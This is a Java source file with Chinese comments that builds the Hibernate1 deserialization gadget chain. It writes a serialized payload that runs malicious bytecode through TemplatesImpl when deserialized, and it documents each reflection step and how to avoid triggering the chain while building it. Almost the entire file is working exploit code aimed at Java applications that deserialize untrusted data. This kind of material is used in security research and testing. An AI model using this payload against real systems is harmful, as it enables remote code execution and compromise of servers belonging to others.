package Hibernate;

/**
 * HashMap.readObject()
 *     TypedValue.hashCode()
 *         ValueHolder.getValue()
 *             ValueHolder.DeferredInitializer().initialize()
 *                 ComponentType.getHashCode()
 * 		            PojoComponentTuplizer.getPropertyValue()
 *                         AbstractComponentTuplizer.getPropertyValue()
 *                             BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()
 *                                 TemplatesImpl.getOutputProperties()
 */

import Tools.SerializeUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.ComponentType;
import org.hibernate.type.Type;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

public class Hibernate1 {
    public static String fileName = "Hibernate1.bin";
    public static void main(String[] args)throws Exception {
        // 生成包含恶意类字节码的 TemplatesImpl 类
        TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
        Method method = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");
        Object getter;
        try {//不同的版本有细小的差别
            // 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            Class<?> getterImpl = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
            Constructor<?> constructor = getterImpl.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            getter = constructor.newInstance(null, null, method);
        } catch (Exception ignored) {
            // 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            Class<?>  basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
            Constructor<?> constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
            constructor.setAccessible(true);
            getter = constructor.newInstance(tmpl.getClass(), method, "outputProperties");
        }
        PojoComponentTuplizer tup = SerializeUtil.createWithoutConstructor(PojoComponentTuplizer.class);
        // 反射将 BasicGetter写入PojoComponentTuplizer的成员变量getters里
        Class abstractComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");
        Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
        field.setAccessible(true);
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        field.set(tup, getters);

        // 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
        ComponentType type = SerializeUtil.createWithoutConstructor(ComponentType.class);
        // 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
        Class<?> componentTypeClass = Class.forName("org.hibernate.type.ComponentType");
        Field field1 = componentTypeClass.getDeclaredField("componentTuplizer");
        field1.setAccessible(true);
        field1.set(type, tup);
        Field field2 = componentTypeClass.getDeclaredField("propertySpan");
        field2.setAccessible(true);
        field2.set(type, 1);

        // 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
        TypedValue typedValue = new TypedValue((Type) type, null);//之所以为null，是避免在生成ser的时候触发漏洞
        // 创建反序列化用 HashMap
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(typedValue, "1");

        // put到hashmap之后再反射写入防止put时触发关键点
        Field valueField = TypedValue.class.getDeclaredField("value");
        valueField.setAccessible(true);
        valueField.set(typedValue, tmpl);

        //序列化，反序列化
        SerializeUtil.writeObjectToFile(hashMap, fileName);
        SerializeUtil.readFileObject(fileName);
    }
}
